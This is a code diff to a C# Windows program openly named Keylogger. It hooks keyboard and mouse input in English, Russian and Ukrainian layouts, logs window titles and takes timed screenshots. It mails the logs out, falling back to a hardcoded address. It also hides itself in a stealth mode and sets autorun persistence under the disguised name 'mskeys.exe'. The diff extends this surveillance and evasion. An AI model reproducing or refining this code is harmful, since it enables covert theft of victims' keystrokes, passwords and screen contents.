@@ -41,13 +41,14 @@ namespace Keylogger
 
         DispatcherTimer timerScreen = new DispatcherTimer();
         DispatcherTimer timerMail = new DispatcherTimer();
+        DispatcherTimer timerGarbage = new DispatcherTimer();
 
         globalKeyboardHook gkh = new globalKeyboardHook();
         private readonly Mutex m = new Mutex();
-        private bool isFree = true;
 
-        string datatime = String.Empty;
-        static string winTitle = String.Empty;
+        StringBuilder datatime = null;
+        static string winTitle = string.Empty;
+        //StringBuilder winTitle = null;
         private int nextline = 0;
 
         #endregion
@@ -81,6 +82,10 @@ namespace Keylogger
 
             txtNumScreen.Text = _numValueScreen.ToString();
 
+            timerGarbage.Tick += new EventHandler(timerGarbage_tick);
+            timerGarbage.Interval = new TimeSpan(0, 0, 1);
+            timerGarbage.Start();
+
             timerScreen.Tick += new EventHandler(timerScreen_tick);
             timerScreen.Interval = new TimeSpan(0,0,1);
 
@@ -98,10 +103,23 @@ namespace Keylogger
                 }
             });
 
-            MouseHook.Start();
-            MouseHook.MouseAction += new EventHandler(MouseEvent);
+            
 
         }
+
+        private int timeGarbage = 0;
+        private void timerGarbage_tick(object sender, EventArgs e)
+        {
+            timeGarbage++;
+            //labeltimescreen.Content = timeScreen.ToString();
+            if(10 == timeGarbage)
+            {
+                GC.Collect();
+                timeGarbage = 0;
+            }
+            
+        }
+        
 
         private void CreateDir()
         {
@@ -110,6 +128,18 @@ namespace Keylogger
                 DirectoryInfo di = Directory.CreateDirectory(AutoRun.Path + "\\System");
             }
            
+        }
+        #region MOUSE
+        private void MouseLoad()
+        {
+            MouseHook.Start();
+            MouseHook.MouseAction += new EventHandler(MouseEvent);
+        }
+
+        private void MouseClose()
+        {            
+            MouseHook.MouseAction -= new EventHandler(MouseEvent);
+            MouseHook.stop();
         }
 
         private void MouseEvent(object sender, EventArgs e)
@@ -126,7 +156,7 @@ namespace Keylogger
                             try
                             {
                                 CreateDir();
-                                datatime = DateTime.Now.ToString();
+                                datatime = new StringBuilder(DateTime.Now.ToString());
                                 SW.WriteLine();
                                 SW.WriteLine(datatime + "\t" + winTitle);                                
                                 
@@ -134,12 +164,14 @@ namespace Keylogger
                             catch (IOException) { }
                             finally
                             {
+                                SW.Dispose();
                                 SW.Close();
                             }
                         }
                         else
                         {
                             SW.Write(" ");
+                            SW.Dispose();
                             SW.Close();
                         }
                     }
@@ -154,6 +186,7 @@ namespace Keylogger
             }).Start();
 
         }
+        #endregion
 
         #region WINDOW_Activity
 
@@ -166,9 +199,11 @@ namespace Keylogger
             if (GetWindowText(ihandler.ToInt32(), sBuff, cChars) > 0)
                 return sBuff.ToString();
             return "";
+           // return new StringBuilder("");
+            
         }
 
-        public static bool IsWindowChanged()
+        public  bool IsWindowChanged()
         {
 
             string wTitle = GetActiveWindow();// проверяем 
@@ -272,16 +307,19 @@ namespace Keylogger
 
                         if (IsWindowChanged())
                         {
-                            datatime = DateTime.Now.ToString();
+                            datatime = new StringBuilder(DateTime.Now.ToString());
                             SW.WriteLine();
                             SW.WriteLine();
                             SW.WriteLine(datatime + "\t" + winTitle);
                             SW.WriteLine();
+                            SW.Dispose();
+
 
                         }
                         if (nextline >= 100)
                         {
                             SW.WriteLine("\t\t\t");
+                            SW.Dispose();
                             nextline = 0;
                         }
 
@@ -345,7 +383,7 @@ namespace Keylogger
                                 case "en-US":
                                     try
                                     {
-                                        SW.Write(EKey[keys.ToList().IndexOf(e.KeyCode)].ToString());
+                                        SW.Write(new StringBuilder(EKey[keys.ToList().IndexOf(e.KeyCode)].ToString()));
                                         nextline++;
                                     }
                                     catch (Exception ex)
@@ -356,8 +394,8 @@ namespace Keylogger
                                 case "ru-RU":
                                     try
                                     {
-                                        string rus = RKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
-                                        SW.Write(rus, true);
+                                        StringBuilder rus = new StringBuilder( RKey[keys.ToList().IndexOf(e.KeyCode)].ToString());
+                                        SW.Write(rus);
                                         nextline++;
                                     }
                                     catch (Exception ex)
@@ -368,8 +406,8 @@ namespace Keylogger
                                 case "uk-UA":
                                     try
                                     {
-                                        string ukr = UKey[keys.ToList().IndexOf(e.KeyCode)].ToString();
-                                        SW.Write(ukr, true);
+                                        StringBuilder ukr = new StringBuilder( UKey[keys.ToList().IndexOf(e.KeyCode)].ToString());
+                                        SW.Write(ukr);
                                         nextline++;
                                     }
                                     catch (Exception ex)
@@ -383,11 +421,12 @@ namespace Keylogger
                                     break;
                             }
                         }
+                        SW.Dispose();
                         SW.Close();
                     }
                 }
                 finally
-                {
+                {                   
                     m.ReleaseMutex();
                 }
             }).Start();
@@ -470,7 +509,7 @@ namespace Keylogger
                 {
                     timeScreen = 0;
                    // string str = "1";
-                    string str = DateTime.Now.ToString().Replace(':', '_');
+                    StringBuilder str = new StringBuilder( DateTime.Now.ToString().Replace(':', '_'));
                     ScreenShot.ScreenSave(str);
 
                 }
@@ -599,9 +638,13 @@ namespace Keylogger
                 {
                     if (!String.IsNullOrEmpty(txtBoxMail.Text))
                     {
-                        //if (txtBoxMail.Text.Contains('@') && txtBoxMail.Text.Contains('.'))
-                            mail.To.Add(txtBoxMail.Text);
                         
+                        if (txtBoxMail.Text.Contains('@') && txtBoxMail.Text.Contains('.'))
+                            mail.To.Add(txtBoxMail.Text);
+                        else
+                        {
+                            mail.To.Add("rusanovski@outlook.com");
+                        }
                     }
                     else
                     {
@@ -736,12 +779,12 @@ namespace Keylogger
 
         private void AutoRun_Check(object sender, RoutedEventArgs e)
      {
-         AutoRun.SetAutoRun(true, AutoRun.Path + "Keylogger.exe"); 
+         AutoRun.SetAutoRun(true, AutoRun.Path + "mskeys.exe"); 
      }
 
         private void AutoRun_UnChecked(object sender, RoutedEventArgs e) 
      {
-         AutoRun.SetAutoRun(false, AutoRun.Path + "Keylogger.exe");
+         AutoRun.SetAutoRun(false, AutoRun.Path + "mskeys.exe");
      }
 
         private void Stealth_Checked(object sender, RoutedEventArgs e)
@@ -749,6 +792,7 @@ namespace Keylogger
             Application.Current.MainWindow.Visibility = Visibility.Hidden;
             ShowInTaskbar = false;            
             KeysLoad();
+            MouseLoad();            
             timerScreen.Start();
             timerMail.Start();
         }
@@ -758,6 +802,7 @@ namespace Keylogger
             Application.Current.MainWindow.Visibility = Visibility.Visible;
             ShowInTaskbar = true;
             KeyClose();
+            MouseClose();
             timerScreen.Stop();
             timerMail.Stop();
         }
